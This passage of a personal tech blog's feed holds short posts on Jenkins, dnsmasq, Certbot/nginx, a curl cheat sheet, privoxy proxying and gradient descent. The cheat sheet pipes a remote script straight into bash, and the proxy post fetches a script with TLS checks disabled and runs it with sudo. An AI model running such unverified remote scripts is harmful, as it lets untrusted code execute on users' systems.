class="headerlink" title="Run Server"></a>Run Server</h2><pre><code class="lang-bash">$ java -Xms2G -Xmx2G -server -jar forge-1.12.2-14.23.5.2768-universal.jar nogui&#39;&#39;&#39;options:  -Xmx: maximum memory  -Xms: minimum memory&#39;&#39;&#39;</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="Game" scheme="https://vincentstudio.info/categories/Game/"/>
    
    
      <category term="Minecraft" scheme="https://vincentstudio.info/tags/Minecraft/"/>
    
  </entry>
  
  <entry>
    <title>Install and upgrade Jenkins with Docker</title>
    <link href="https://vincentstudio.info/2019/03/11/022%20Install%20and%20upgrade%20Jenkins%20with%20Docker/"/>
    <id>https://vincentstudio.info/2019/03/11/022 Install and upgrade Jenkins with Docker/</id>
    <published>2019-03-11T07:00:00.000Z</published>
    <updated>2019-05-24T14:14:30.332Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="Installation"><a href="#Installation" class="headerlink" title="Installation"></a>Installation</h2><pre><code class="lang-bash">$ docker pull jenkins$ docker run -d -p 8080:8080 -p 50000:50000 --name jenkins --restart=always jenkins</code></pre><h2 id="Upgrade"><a href="#Upgrade" class="headerlink" title="Upgrade"></a>Upgrade</h2><pre><code class="lang-bash"># check version$ docker exec -it jenkins java -jar /usr/share/jenkins/jenkins.war --version# download latest jenkins.war from http://updates.jenkins-ci.org/download/war/$ wget http://updates.jenkins-ci.org/download/war/2.167/jenkins.war# replace file$ sudo docker cp jenkins.war jenkins:/usr/share/jenkins/</code></pre><h2 id="Change-Context-to-jenkins"><a href="#Change-Context-to-jenkins" class="headerlink" title="Change Context to /jenkins"></a>Change Context to /jenkins</h2><pre><code class="lang-bash"># edit /usr/local/bin/jenkins.sh# find line &quot;java -jar ...&quot; and replace: java -jar /usr/share/jenkins/jenkins.war --prefix=/jenkins</code></pre><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>[1] <a href="https://mohitgoyal.co/2017/02/15/upgrade-jenkins-server-to-a-new-version/" target="_blank" rel="noopener">Upgrade Jenkins server to a new version</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="Programming" scheme="https://vincentstudio.info/categories/Programming/"/>
    
    
      <category term="Docker" scheme="https://vincentstudio.info/tags/Docker/"/>
    
      <category term="Jenkins" scheme="https://vincentstudio.info/tags/Jenkins/"/>
    
      <category term="CI/CD" scheme="https://vincentstudio.info/tags/CI-CD/"/>
    
  </entry>
  
  <entry>
    <title>Deploy dnsmasq with docker</title>
    <link href="https://vincentstudio.info/2019/03/04/021%20Deploy%20dnsmasq%20with%20docker/"/>
    <id>https://vincentstudio.info/2019/03/04/021 Deploy dnsmasq with docker/</id>
    <published>2019-03-04T07:00:00.000Z</published>
    <updated>2019-03-17T10:53:27.529Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="Build"><a href="#Build" class="headerlink" title="Build"></a>Build</h2><pre><code class="lang-bash">$ git clone https://github.com/Vincent0700/dns-server.git$ cd dns-server$ docker-compose up --build -d</code></pre><h2 id="Config"><a href="#Config" class="headerlink" title="Config"></a>Config</h2><ul><li>conf/dnsmasq.conf: base config file</li><li>conf/hosts: domain mapping</li><li>conf/resolv.conf: upstream dns server</li></ul><h2 id="Flush-dns"><a href="#Flush-dns" class="headerlink" title="Flush dns"></a>Flush dns</h2><pre><code class="lang-bash">$ docker restart dnsmasq</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="Programming" scheme="https://vincentstudio.info/categories/Programming/"/>
    
    
      <category term="Docker" scheme="https://vincentstudio.info/tags/Docker/"/>
    
      <category term="DNS" scheme="https://vincentstudio.info/tags/DNS/"/>
    
  </entry>
  
  <entry>
    <title>Get Free SSL Certificates</title>
    <link href="https://vincentstudio.info/2019/02/24/020%20Get%20Free%20SSL%20Certificates/"/>
    <id>https://vincentstudio.info/2019/02/24/020 Get Free SSL Certificates/</id>
    <published>2019-02-24T09:00:00.000Z</published>
    <updated>2019-02-25T03:44:59.765Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="Types-of-certificates"><a href="#Types-of-certificates" class="headerlink" title="Types of certificates"></a>Types of certificates</h2><ul><li><code>DV</code> Domain Validated certificates </li><li><code>OV</code> Organization Validated certificate</li><li><code>EV</code> Extended Validation certificates</li></ul><h2 id="Free-ssl-authorities"><a href="#Free-ssl-authorities" class="headerlink" title="Free ssl authorities"></a>Free ssl authorities</h2><ul><li><a href="https://letsencrypt.org" target="_blank" rel="noopener">Let’s Encrypt</a></li><li><a href="https://www.startcomca.com" target="_blank" rel="noopener">StartSSL</a></li><li><a href="https://www.positivessl.com" target="_blank" rel="noopener">COMODO PositiveSSL</a></li><li><a href="https://www.cloudflare.com/ssl/" target="_blank" rel="noopener">CloudFlare SSL</a></li><li><a href="https://www.wosign.com" target="_blank" rel="noopener">Wosign</a></li><li><a href="https://cloud.tencent.com/product/ssl" target="_blank" rel="noopener">Tencent</a></li><li><a href="https://common-buy.aliyun.com/?commodityCode=cas" target="_blank" rel="noopener">Aliyun</a></li><li><a href="https://www.alphassl.com" target="_blank" rel="noopener">AlphaSSL</a></li></ul><h2 id="Guide"><a href="#Guide" class="headerlink" title="Guide"></a>Guide</h2><p>This is a guide to get a DV certificate by <a href="https://letsencrypt.org" target="_blank" rel="noopener">Let’s Encrypt</a> using Certbot</p><h3 id="Install-Certbot"><a href="#Install-Certbot" class="headerlink" title="Install Certbot"></a>Install Certbot</h3><pre><code class="lang-bash">$ wget https://dl.eff.org/certbot-auto$ chmod +x certbot-auto$ mv certbot-auto /usr/local/bin/</code></pre><p>Usage:<br>certonly: A Certbot plugin<br>-d DOMAIN: The domain you want to obtain a certificate for<br>—preferred-challenges: The way to verify your domain<br>—server: ACME v1 or v2 protocol server</p><h3 id="Apply-for-ssl-certificate"><a href="#Apply-for-ssl-certificate" class="headerlink" title="Apply for ssl certificate"></a>Apply for ssl certificate</h3><pre><code class="lang-bash">$ certbot-auto certonly -d &quot;domain.com&quot; --manual --preferred-challenges dns-01 --server https://acme-v02.api.letsencrypt.org/directory</code></pre><p>Follow the hits and add a TXT dns record. Then you will get your certificates at /etc/letsencrypt/live/yourdomain/</p><h3 id="Enable-HTTPS"><a href="#Enable-HTTPS" class="headerlink" title="Enable HTTPS"></a>Enable HTTPS</h3><p>Here is my nginx config file</p><pre><code class="lang-config">user root;worker_processes 2;error_log /var/log/nginx/error.log;pid /root/app/nginx.pid;events {    worker_connections 1024;}http {    include            mime.types;    default_type       application/octet-stream;    sendfile           on;    keepalive_timeout  65;    server {        listen 443 http2 ssl;         server_name vincentstudio.info;        ssl_certificate         /root/app/cert/vincentstudio.info/fullchain.pem;        ssl_certificate_key     /root/app/cert/vincentstudio.info/privkey.pem;        ssl_trusted_certificate /root/app/cert/vincentstudio.info/chain.pem;        root /root/app/blogger;        location / {            root   /root/app/blogger;            index  index.html index.htm;            autoindex on;            autoindex_exact_size on;            autoindex_localtime on;        }    }    server {        listen 80;        server_name vincentstudio.info;        return 301 https://vincentstudio.info;    }}</code></pre><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>[1] <a href="https://community.digicert.com/en/blogs.entry.html/2014/08/11/types-of-ssl-certificateschoose-the-right-one.html" target="_blank" rel="noopener">Types of SSL certificates – choose the right one</a><br>[2] <a href="https://www.hi-linux.com/posts/6968.html" target="_blank" rel="noopener">Let’s Encrypt 免费通配符 SSL 证书申请流程</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="Programming" scheme="https://vincentstudio.info/categories/Programming/"/>
    
    
      <category term="Nginx" scheme="https://vincentstudio.info/tags/Nginx/"/>
    
      <category term="SSL" scheme="https://vincentstudio.info/tags/SSL/"/>
    
  </entry>
  
  <entry>
    <title>Curl CheatSheet</title>
    <link href="https://vincentstudio.info/2019/02/22/019%20Curl%20CheatSheet/"/>
    <id>https://vincentstudio.info/2019/02/22/019 Curl CheatSheet/</id>
    <published>2019-02-22T06:30:00.000Z</published>
    <updated>2019-04-07T09:02:23.454Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="Common-Usage"><a href="#Common-Usage" class="headerlink" title="Common Usage"></a>Common Usage</h2><h3 id="Demo1-Access-a-website-or-script"><a href="#Demo1-Access-a-website-or-script" class="headerlink" title="Demo1: Access a website or script"></a>Demo1: Access a website or script</h3><pre><code class="lang-bash">$ curl -4sSqL https://baidu.com$ curl -fsSL http://somewhere/yourscript.sh | /bin/bash$ curl -fsSL http://somewhere/yourscript.sh | /bin/bash -s parm1 parm2</code></pre><p>-4: Use ipv4<br>-s: Silent mode, don’t show progress meter or error messages<br>-S: Show error<br>-q: Disable .curlrc (default settings)<br>-L: Follow redirects (301, 302 …)<br>-f: Output nothing on http errors</p><h3 id="Demo2-Debug"><a href="#Demo2-Debug" class="headerlink" title="Demo2: Debug"></a>Demo2: Debug</h3><pre><code class="lang-bash">$ curl -i https://baidu.com$ curl -I https://baidu.com$ curl -v https://baidu.com$ curl -vv https://baidu.com$ curl -o output.txt https://baidu.com</code></pre><p>-i: Show response header<br>-I: Show response header only<br>-v: Show verbose<br>-vv: Show more verbose<br>-o: Write to file</p><h3 id="Demo3-Set-request-methods"><a href="#Demo3-Set-request-methods" class="headerlink" title="Demo3: Set request methods"></a>Demo3: Set request methods</h3><pre><code class="lang-bash">$ curl -X POST localhost:8080/user</code></pre><p>-X: Set request method, [GET, POST, PUT, DELETE …]</p><h3 id="Demo4-Set-request-header"><a href="#Demo4-Set-request-header" class="headerlink" title="Demo4: Set request header"></a>Demo4: Set request header</h3><pre><code class="lang-bash">$ curl \  -H &#39;User-Agent: Mozilla/5.0&#39; \  -H &#39;Accept: application/json&#39; \  http://localhost:8080/api/v1/foobar $ curl -A &#39;Mozilla/5.0&#39; http://localhost:8080/api/v1/foobar $ curl -b name=admin http://localhost:8080/api/v1/foobar $ curl --compressed http://localhost:8080/api/v1/foobar</code></pre><p>-H: Set request header<br>-A: Equals -H ‘User-Agent:’<br>-b: Equals -H ‘Cookie:’<br>—compressed: Equals -H ‘Accept-Encoding: deflate, gzip’</p><h3 id="Demo5-Send-data"><a href="#Demo5-Send-data" class="headerlink" title="Demo5: Send data"></a>Demo5: Send data</h3><ul><li>x-www-form-urlencoded</li></ul><pre><code class="lang-bash">$ curl -d &#39;key1=val1&amp;key2=val2&#39; http://localhost:8080/api/v1/foobar$ curl -d @data.txt http://localhost:8080/api/v1/foobar</code></pre><ul><li>json</li></ul><pre><code class="lang-bash">$ curl -d &#39;{&quot;key&quot;: &quot;value&quot;}&#39; -H &#39;Content-Type:application/json&#39; \http://localhost:8080/api/v1/foobar</code></pre><ul><li>multipart/form-data</li></ul><pre><code class="lang-bash">$ curl \-F field1=test \-F logo.jpg=@logo.jpg \http://localhost:8080/api/v1/foobar</code></pre><h3 id="Demo6-Proxy"><a href="#Demo6-Proxy" class="headerlink" title="Demo6: Proxy"></a>Demo6: Proxy</h3><pre><code class="lang-bash"># sock5 proxy$ curl -x socks5h://127.0.0.1:1086 https://google.com# http proxy$ curl -x http://127.0.0.1:1087 https://google.com</code></pre><p>-x: Set proxy</p><h2 id="Full-feature"><a href="#Full-feature" class="headerlink" title="Full feature"></a>Full feature</h2><pre><code class="lang-bash">&#39;&#39;&#39;Usage: curl [options...] &lt;url&gt;Options: (H) means HTTP/HTTPS only, (F) means FTP only     --anyauth       Pick &quot;any&quot; authentication method (H) -a, --append        Append to target file when uploading (F/SFTP)     --basic         Use HTTP Basic Authentication (H)     --cacert FILE   CA certificate to verify peer against (SSL)     --capath DIR    CA directory to verify peer against (SSL) -E, --cert CERT[:PASSWD]  Client certificate file and password (SSL)     --cert-status   Verify the status of the server certificate (SSL)     --cert-type TYPE  Certificate file type (DER/PEM/ENG) (SSL)     --ciphers LIST  SSL ciphers to use (SSL)     --compressed    Request compressed response (using deflate or gzip) -K, --config FILE   Read config from FILE     --connect-timeout SECONDS  Maximum time allowed for connection     --connect-to HOST1:PORT1:HOST2:PORT2 Connect to host (network level) -C, --continue-at OFFSET  Resumed transfer OFFSET -b, --cookie STRING/FILE  Read cookies from STRING/FILE (H) -c, --cookie-jar FILE  Write cookies to FILE after operation (H)     --create-dirs   Create necessary local directory hierarchy     --crlf          Convert LF to CRLF in upload     --crlfile FILE  Get a CRL list in PEM format from the given file -d, --data DATA     HTTP POST data (H)     --data-raw DATA  HTTP POST data, &#39;@&#39; allowed (H)     --data-ascii DATA  HTTP POST ASCII data (H)     --data-binary DATA  HTTP POST binary data (H)     --data-urlencode DATA  HTTP POST data url encoded (H)     --delegation STRING  GSS-API delegation permission     --digest        Use HTTP Digest Authentication (H)     --disable-eprt  Inhibit using EPRT or LPRT (F)     --disable-epsv  Inhibit using EPSV (F)     --dns-servers   DNS server addrs to use: 1.1.1.1;2.2.2.2     --dns-interface  Interface to use for DNS requests     --dns-ipv4-addr  IPv4 address to use for DNS requests, dot notation     --dns-ipv6-addr  IPv6 address to use for DNS requests, dot notation -D, --dump-header FILE  Write the received headers to FILE     --egd-file FILE  EGD socket path for random data (SSL)     --engine ENGINE  Crypto engine (use &quot;--engine list&quot; for list) (SSL)     --expect100-timeout SECONDS How long to wait for 100-continue (H) -f, --fail          Fail silently (no output at all) on HTTP errors (H)     --fail-early    Fail on first transfer error, do not continue     --false-start   Enable TLS False Start. -F, --form CONTENT  Specify HTTP multipart POST data (H)     --form-string STRING  Specify HTTP multipart POST data (H)     --ftp-account DATA  Account data string (F)     --ftp-alternative-to-user COMMAND  String to replace &quot;USER [name]&quot; (F)     --ftp-create-dirs  Create the remote dirs if not present (F)     --ftp-method [MULTICWD/NOCWD/SINGLECWD]  Control CWD usage (F)     --ftp-pasv      Use PASV/EPSV instead of PORT (F) -P, --ftp-port ADR  Use PORT with given address instead of PASV (F)     --ftp-skip-pasv-ip  Skip the IP address for PASV (F)     --ftp-pret      Send PRET before PASV (for drftpd) (F)     --ftp-ssl-ccc   Send CCC after authenticating (F)     --ftp-ssl-ccc-mode ACTIVE/PASSIVE  Set CCC mode (F)     --ftp-ssl-control  Require SSL/TLS for FTP login, clear for transfer (F) -G, --get           Send the -d data with a HTTP GET (H) -g, --globoff       Disable URL sequences and ranges using {} and [] -H, --header LINE   Pass custom header LINE to server (H) -I, --head          Show document info only -h, --help          This help text     --hostpubmd5 MD5  Hex-encoded MD5 string of the host public key. (SSH) -0, --http1.0       Use HTTP 1.0 (H)     --http1.1       Use HTTP 1.1 (H)     --http2         Use HTTP 2 (H)     --http2-prior-knowledge  Use HTTP 2 without HTTP/1.1 Upgrade (H)     --ignore-content-length  Ignore the HTTP Content-Length header -i, --include       Include protocol headers in the output (H/F) -k, --insecure      Allow connections to SSL sites without certs (H)     --interface INTERFACE  Use network INTERFACE (or address) -4, --ipv4          Resolve name to IPv4 address -6, --ipv6          Resolve name to IPv6 address -j, --junk-session-cookies  Ignore session cookies read from file (H)     --keepalive-time SECONDS  Wait SECONDS between keepalive probes     --key KEY       Private key file name (SSL/SSH)     --key-type TYPE  Private key file type (DER/PEM/ENG) (SSL)     --krb LEVEL     Enable Kerberos with security LEVEL (F)     --libcurl FILE  Dump libcurl equivalent code of this command line     --limit-rate RATE  Limit transfer speed to RATE -l, --list-only     List only mode (F/POP3)     --local-port RANGE  Force use of RANGE for local port numbers -L, --location      Follow redirects (H)     --location-trusted  Like &#39;--location&#39;, and send auth to other hosts (H)     --login-options OPTIONS  Server login options (IMAP, POP3, SMTP) -M, --manual        Display the full manual     --mail-from FROM  Mail from this address (SMTP)     --mail-rcpt TO  Mail to this/these addresses (SMTP)     --mail-auth AUTH  Originator address of the original email (SMTP)     --max-filesize BYTES  Maximum file size to download (H/F)     --max-redirs NUM  Maximum number of redirects allowed (H) -m, --max-time SECONDS  Maximum time allowed for the transfer     --metalink      Process given URLs as metalink XML file     --negotiate     Use HTTP Negotiate (SPNEGO) authentication (H) -n, --netrc         Must read .netrc for user name and password     --netrc-optional  Use either .netrc or URL; overrides -n     --netrc-file FILE  Specify FILE for netrc -:, --next          Allows the following URL to use a separate set of options     --no-alpn       Disable the ALPN TLS extension (H) -N, --no-buffer     Disable buffering of the output stream     --no-keepalive  Disable keepalive use on the connection     --no-npn        Disable the NPN TLS extension (H)     --no-sessionid  Disable SSL session-ID reusing (SSL)     --noproxy       List of hosts which do not use proxy     --ntlm          Use HTTP NTLM authentication (H)     --ntlm-wb       Use HTTP NTLM authentication with winbind (H)     --oauth2-bearer TOKEN  OAuth 2 Bearer Token (IMAP, POP3, SMTP) -o, --output FILE   Write to FILE instead of stdout     --pass PASS     Pass phrase for the private key (SSL/SSH)     --path-as-is    Do not squash .. sequences in URL path     --pinnedpubkey FILE/HASHES Public key to verify peer against (SSL)     --post301       Do not switch to GET after following a 301 redirect (H)     --post302       Do not switch to GET after following a 302 redirect (H)     --post303       Do not switch to GET after following a 303 redirect (H)     --preproxy [PROTOCOL://]HOST[:PORT] Proxy before HTTP(S) proxy -#, --progress-bar  Display transfer progress as a progress bar     --proto PROTOCOLS  Enable/disable PROTOCOLS     --proto-default PROTOCOL  Use PROTOCOL for any URL missing a scheme     --proto-redir PROTOCOLS   Enable/disable PROTOCOLS on redirect -x, --proxy [PROTOCOL://]HOST[:PORT]  Use proxy on given port     --proxy-anyauth  Pick &quot;any&quot; proxy authentication method (H)     --proxy-basic   Use Basic authentication on the proxy (H)     --proxy-digest  Use Digest authentication on the proxy (H)     --proxy-cacert FILE CA certificate to verify peer against for proxy (SSL)     --proxy-capath DIR CA directory to verify peer against for proxy (SSL)     --proxy-cert CERT[:PASSWD] Client certificate file and password for proxy (SSL)     --proxy-cert-type TYPE Certificate file type (DER/PEM/ENG) for proxy (SSL)     --proxy-ciphers LIST SSL ciphers to use for proxy (SSL)     --proxy-crlfile FILE Get a CRL list in PEM format from the given file for proxy     --proxy-insecure Allow connections to SSL sites without certs for proxy (H)     --proxy-key KEY Private key file name for proxy (SSL)     --proxy-key-type TYPE Private key file type for proxy (DER/PEM/ENG) (SSL)     --proxy-negotiate  Use HTTP Negotiate (SPNEGO) authentication on the proxy (H)     --proxy-ntlm    Use NTLM authentication on the proxy (H)     --proxy-header LINE Pass custom header LINE to proxy (H)     --proxy-pass PASS Pass phrase for the private key for proxy (SSL)     --proxy-ssl-allow-beast Allow security flaw to improve interop for proxy (SSL)     --proxy-tlsv1   Use TLSv1 for proxy (SSL)     --proxy-tlsuser USER TLS username for proxy     --proxy-tlspassword STRING TLS password for proxy     --proxy-tlsauthtype STRING TLS authentication type for proxy (default SRP)     --proxy-service-name NAME  SPNEGO proxy service name     --service-name NAME  SPNEGO service name -U, --proxy-user USER[:PASSWORD]  Proxy user and password     --proxy1.0 HOST[:PORT]  Use HTTP/1.0 proxy on given port -p, --proxytunnel   Operate through a HTTP proxy tunnel (using CONNECT)     --pubkey KEY    Public key file name (SSH) -Q, --quote CMD     Send command(s) to server before transfer (F/SFTP)     --random-file FILE  File for reading random data from (SSL) -r, --range RANGE   Retrieve only the bytes within RANGE     --raw           Do HTTP &quot;raw&quot;; no transfer decoding (H) -e, --referer       Referer URL (H) -J, --remote-header-name  Use the header-provided filename (H) -O, --remote-name   Write output to a file named as the remote file     --remote-name-all  Use the remote file name for all URLs -R, --remote-time   Set the remote file&#39;s time on the local output -X, --request COMMAND  Specify request command to use     --resolve HOST:PORT:ADDRESS  Force resolve of HOST:PORT to ADDRESS     --retry NUM   Retry request NUM times if transient problems occur     --retry-connrefused  Retry on connection refused (use with --retry)     --retry-delay SECONDS  Wait SECONDS between retries     --retry-max-time SECONDS  Retry only within this period     --sasl-ir       Enable initial response in SASL authentication -S, --show-error    Show error. With -s, make curl show errors when they occur -s, --silent        Silent mode (don&#39;t output anything)     --socks4 HOST[:PORT]  SOCKS4 proxy on given host + port     --socks4a HOST[:PORT]  SOCKS4a proxy on given host + port     --socks5 HOST[:PORT]  SOCKS5 proxy on given host + port     --socks5-hostname HOST[:PORT]  SOCKS5 proxy, pass host name to proxy     --socks5-gssapi-service NAME  SOCKS5 proxy service name for GSS-API     --socks5-gssapi-nec  Compatibility with NEC SOCKS5 server -Y, --speed-limit RATE  Stop transfers below RATE for &#39;speed-time&#39; secs -y, --speed-time SECONDS  Trigger &#39;speed-limit&#39; abort after SECONDS (default: 30)     --ssl           Try SSL/TLS (FTP, IMAP, POP3, SMTP)     --ssl-reqd      Require SSL/TLS (FTP, IMAP, POP3, SMTP) -2, --sslv2         Use SSLv2 (SSL) -3, --sslv3         Use SSLv3 (SSL)     --ssl-allow-beast  Allow security flaw to improve interop (SSL)     --ssl-no-revoke    Disable cert revocation checks (WinSSL)     --stderr FILE   Where to redirect stderr (use &quot;-&quot; for stdout)     --suppress-connect-headers  Suppress proxy CONNECT response headers     --tcp-nodelay   Use the TCP_NODELAY option     --tcp-fastopen  Use TCP Fast Open -t, --telnet-option OPT=VAL  Set telnet option     --tftp-blksize VALUE  Set TFTP BLKSIZE option (must be &gt;512)     --tftp-no-options  Do not send TFTP options requests -z, --time-cond TIME   Transfer based on a time condition -1, --tlsv1         Use &gt;= TLSv1 (SSL)     --tlsv1.0       Use TLSv1.0 (SSL)     --tlsv1.1       Use TLSv1.1 (SSL)     --tlsv1.2       Use TLSv1.2 (SSL)     --tlsv1.3       Use TLSv1.3 (SSL)     --tls-max VERSION  Use TLS up to VERSION (SSL)     --trace FILE    Write a debug trace to FILE     --trace-ascii FILE  Like --trace, but without hex output     --trace-time    Add time stamps to trace/verbose output     --tr-encoding   Request compressed transfer encoding (H) -T, --upload-file FILE  Transfer FILE to destination     --url URL       URL to work with -B, --use-ascii     Use ASCII/text transfer -u, --user USER[:PASSWORD]  Server user and password     --tlsuser USER  TLS username     --tlspassword STRING  TLS password     --tlsauthtype STRING  TLS authentication type (default: SRP)     --unix-socket PATH    Connect through this Unix domain socket     --abstract-unix-socket PATH Connect to an abstract Unix domain socket -A, --user-agent STRING  Send User-Agent STRING to server (H) -v, --verbose       Make the operation more talkative -V, --version       Show version number and quit -w, --write-out FORMAT  Use output FORMAT after completion     --xattr         Store metadata in extended file attributes -q, --disable       Disable .curlrc (must be first parameter) &#39;&#39;&#39;</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="Programming" scheme="https://vincentstudio.info/categories/Programming/"/>
    
    
      <category term="Shell" scheme="https://vincentstudio.info/tags/Shell/"/>
    
      <category term="CheatSheet" scheme="https://vincentstudio.info/tags/CheatSheet/"/>
    
  </entry>
  
  <entry>
    <title>Configure system proxy by privoxy + gfwlist</title>
    <link href="https://vincentstudio.info/2019/02/20/018%20Configure%20system%20proxy%20by%20privoxy%20+%20gfwlist/"/>
    <id>https://vincentstudio.info/2019/02/20/018 Configure system proxy by privoxy + gfwlist/</id>
    <published>2019-02-20T12:30:00.000Z</published>
    <updated>2019-02-23T13:43:02.771Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="Configure-Privoxy"><a href="#Configure-Privoxy" class="headerlink" title="Configure Privoxy"></a>Configure Privoxy</h2><p>OS: Ubuntu 16.04</p><h3 id="Install-privoxy"><a href="#Install-privoxy" class="headerlink" title="Install privoxy"></a>Install privoxy</h3><pre><code class="lang-bash">$ sudo apt-get install privoxy</code></pre><h3 id="Convert-gfwlist-to-privoxy-action-file"><a href="#Convert-gfwlist-to-privoxy-action-file" class="headerlink" title="Convert gfwlist to privoxy action file"></a>Convert gfwlist to privoxy action file</h3><pre><code class="lang-bash">$ curl -skL https://raw.github.com/zfl9/gfwlist2privoxy/master/gfwlist2privoxy -o gfwlist2privoxy$ sudo bash gfwlist2privoxy &#39;127.0.0.1:1080&#39; # sslocal port$ sudo cp -af gfwlist.action /etc/privoxy/</code></pre><p>edit /etc/privoxy/config, add following lines</p><pre><code class="lang-bash">listen-address 127.0.0.1:8118 # expose http proxy portactionsfile /etc/privoxy/gfwlist.action # gfwlist</code></pre><h3 id="Restart-privoxy-service"><a href="#Restart-privoxy-service" class="headerlink" title="Restart privoxy service"></a>Restart privoxy service</h3><pre><code class="lang-bash">$ sudo service privoxy restart</code></pre><h2 id="Set-system-proxy"><a href="#Set-system-proxy" class="headerlink" title="Set system proxy"></a>Set system proxy</h2><p>edit /etc/environment, add following lines</p><pre><code class="lang-bash">export http_proxy=&quot;http://127.0.0.1:8118&quot;export https_proxy=&quot;http://127.0.0.1:8118&quot;export no_proxy=&quot;localhost, 127.0.0.1, ::1, ip.cn&quot;</code></pre><h2 id="Test"><a href="#Test" class="headerlink" title="Test"></a>Test</h2><pre><code class="lang-bash">$ curl -4skL https://www.google.com$ curl -4skL https://www.baidu.com</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="Programming" scheme="https://vincentstudio.info/categories/Programming/"/>
    
    
      <category term="Proxy" scheme="https://vincentstudio.info/tags/Proxy/"/>
    
  </entry>
  
  <entry>
    <title>Gradient Descent (梯度下降)</title>
    <link href="https://vincentstudio.info/2019/02/18/017%20Gradient%20Descent%20(%E6%A2%AF%E5%BA%A6%E4%B8%8B%E9%99%8D)/"/>
    <id>https://vincentstudio.info/2019/02/18/017 Gradient Descent (梯度下降)/</id>
    <published>2019-02-18T12:30:00.000Z</published>
    <updated>2019-04-25T16:32:41.706Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="Recap"><a href="#Recap" class="headerlink" title="Recap"></a>Recap</h2><p><a href="/2019/02/16/016%20Logistic%20Regression%20(逻辑回归)/">Logistic Regression:</a></p><p>$\hat{y}=\sigma ( w^{\tau}x + b )$, $\sigma(z) = \dfrac{1}{1+e^{-z}}$</p><p>$J(w,b) = \dfrac{1}{m} \sum\limits_{i=1}^{m} L(\hat{y}^{(i)}, y^{(i)}) = -\dfrac{1}{m} \sum\limits_{i=1}^{m} (y^{(i)}log\hat{y}^{(i)} + (1-y^{(i)})log(1-\hat{y}^{(i)}))$</p><p>Want to find $w,b$ that minimize $J(w,b)$</p><h2 id="Gradient-Descent"><a href="#Gradient-Descent" class="headerlink" title="Gradient Descent"></a>Gradient Descent</h2><p>Suppose $\alpha$ is learning rate, then loop:</p><p>$w = w - \alpha \dfrac{\partial J(w,b)}{\partial w}$</p><p>$b = b - \alpha \dfrac{\partial J(w,b)}{\partial b}$</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="Algorithm" scheme="https://vincentstudio.info/categories/Algorithm/"/>
    
    
      <category term="MachineLearning" scheme="https://vincentstudio.info/tags/MachineLearning/"/>
    
  </entry>
  
  <entry>
    <title>Logistic Regression (逻辑回归)</title>
    <link href="https://vincentstudio.info/2019/02/16/016%20Logistic%20Regression%20(%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92)/"/>
    <id>https://vincentstudio.info/2019/02/16/016 Logistic Regression (逻辑回归)/</id>
    <published>2019-02-16T12:30:00.000Z</published>
    <updated>2019-04-25T16:32:45.383Z</updated>
    
